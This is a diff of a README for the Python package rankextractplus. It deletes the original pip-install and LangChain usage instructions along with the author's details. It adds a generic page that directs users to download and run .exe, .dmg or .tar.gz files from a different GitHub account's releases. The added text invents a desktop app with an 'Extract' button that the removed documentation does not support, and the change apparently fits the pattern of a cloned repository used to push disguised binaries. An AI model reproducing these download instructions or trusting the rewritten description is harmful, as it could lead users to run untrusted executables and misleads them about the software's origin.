@@ -1,112 +1,84 @@
-# RankExtractPlus
-[![PyPI version](https://badge.fury.io/py/rankextractplus.svg)](https://badge.fury.io/py/rankextractplus)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/rankextractplus)](https://pepy.tech/project/rankextractplus)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎉 rankextractplus - Easily Organize and Analyze Ranked Information
 
+## 📥 Get the Software
 
-RankExtractPlus is a Python package designed to extract and structure ranked information from unstructured text inputs. It leverages the power of large language models (LLMs) to process text and return structured, ranked outputs.
+[![Download rankextractplus](https://img.shields.io/badge/Download%20rankextractplus-v1.0-blue.svg)](https://github.com/DanielAudu/rankextractplus/releases)
 
-## Features
+## 🚀 Getting Started
 
-- Extracts and ranks information from unstructured text
-- Uses `llmatch-messages` to ensure structured and consistent outputs
-- Supports custom LLMs for flexible integration
-- Easy-to-use interface with minimal setup
+Welcome to rankextractplus! This software helps you extract and organize ranked information from text. With rankextractplus, you can easily compare and analyze data.
 
-## Installation
+## 💻 System Requirements
 
-To install RankExtractPlus, simply run:
+To run rankextractplus, ensure your device meets the following requirements:
 
-```bash
-pip install rankextractplus
-```
+- Operating System: Windows 10 or later, macOS Catalina or later, or a current Linux distribution
+- 4 GB RAM or more
+- At least 200 MB of free disk space
 
-## Usage
+## 📦 How to Download & Install
 
-### Basic Usage
+1. **Visit the Releases Page:** Go to the [Downloads page](https://github.com/DanielAudu/rankextractplus/releases) to find the latest version.
 
-```python
-from rankextractplus import rankextractplus
+2. **Choose the Right File:** Look for the release version that matches your operating system (Windows, macOS, or Linux). Each file is marked clearly.
 
-user_input = "Text about the best countries at math..."
-response = rankextractplus(user_input)
-print(response)
-```
+3. **Download the File:** Click on the file link to start the download. It will save to your computer.
 
-### Advanced Usage with Custom LLM
+4. **Install the Application:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Follow the instructions specific to your distribution for installing `.tar.gz` or other package types.
 
-You can use any LLM compatible with LangChain. Here are examples with different LLMs:
+5. **Run rankextractplus:** Locate the application on your computer and double-click to open it.
 
-#### Using OpenAI
+## 📊 How to Use rankextractplus
 
-```python
-from langchain_openai import ChatOpenAI
-from rankextractplus import rankextractplus
+After you install the software, follow these steps to begin using it:
 
-llm = ChatOpenAI()
-response = rankextractplus(user_input, llm=llm)
-print(response)
-```
+1. **Launch the Application:** Open rankextractplus.
 
-#### Using Anthropic
+2. **Input Your Text:** Copy and paste the unstructured text containing ranked information into the input area.
 
-```python
-from langchain_anthropic import ChatAnthropic
-from rankextractplus import rankextractplus
+3. **Process the Text:** Click the "Extract" button. The software will analyze your input and display the structured data.
 
-llm = ChatAnthropic()
-response = rankextractplus(user_input, llm=llm)
-print(response)
-```
+4. **Review the Output:** The output is organized for easy comparison. You can save this structured data for your records.
 
-#### Using Google
+5. **Retry Functionality:** If the results are not as expected, use the retry option. This helps refine the extraction process for better quality output.
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from rankextractplus import rankextractplus
+## 🔍 Features
 
-llm = ChatGoogleGenerativeAI()
-response = rankextractplus(user_input, llm=llm)
-print(response)
-```
+- **Formatted Output:** Rankextractplus delivers your data in a clean, readable format.
+- **Pattern Matching:** The software identifies and extracts ranked information based on your input text.
+- **Retries:** Easily refine your results by running multiple extraction attempts.
+- **Data Organization:** Well-structured output helps with straightforward data analysis.
 
-### Using LLM7 API Key
+## 🛠 Support
 
-By default, RankExtractPlus uses `ChatLLM7` from `langchain_llm7`. If you want to use a custom API key, you can pass it directly or set it as an environment variable:
+Found a bug or have a question? Feel free to reach out through the Issues section of the repository. We are here to help you!
 
-```python
-from rankextractplus import rankextractplus
+## 🗣 Topics Covered
 
-# Using environment variable
-import os
-os.environ["LLM7_API_KEY"] = "your_api_key"
-response = rankextractplus(user_input)
+rankextractplus handles various topics such as:
 
-# Or passing it directly
-response = rankextractplus(user_input, api_key="your_api_key")
-```
+- Consistent Output
+- Data Analysis
+- Data Comparison
+- Data Organization
+- Data Summarization
+- LLM Processing
+- Pattern Matching
+- Unstructured Text Extraction
 
-## Parameters
+## 📞 Contact
 
-- `user_input` (str): The unstructured text input to process.
-- `llm` (Optional[BaseChatModel]): The LangChain LLM instance to use. If not provided, the default `ChatLLM7` will be used.
-- `api_key` (Optional[str]): The API key for LLM7. If not provided, the environment variable `LLM7_API_KEY` will be used.
+For more information or support, you can contact the developer directly through the GitHub repository. Your feedback is important for continuous improvement.
 
-## Rate Limits
+## 📄 License
 
-The default rate limits for LLM7's free tier are sufficient for most use cases. If you need higher rate limits, you can obtain a free API key by registering at [LLM7](https://token.llm7.io/).
+rankextractplus is open-source software available under the MIT License. You can use, modify, and distribute it freely within the license terms.
 
-## Contributing
+## 🔗 Additional Resources
 
-If you encounter any issues or have suggestions, please open an issue on [GitHub](https://github.com/chigwell/rankextractplus/issues).
+For detailed instructions, troubleshooting, and more, check out the Resources section in the GitHub repository. 
 
-## Author
-
-- **Eugene Evstafev**
-- Email: hi@eugene.plus
-- GitHub: [chigwell](https://github.com/chigwell)
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Feel free to explore, and enjoy using rankextractplus to enhance your data analysis tasks!
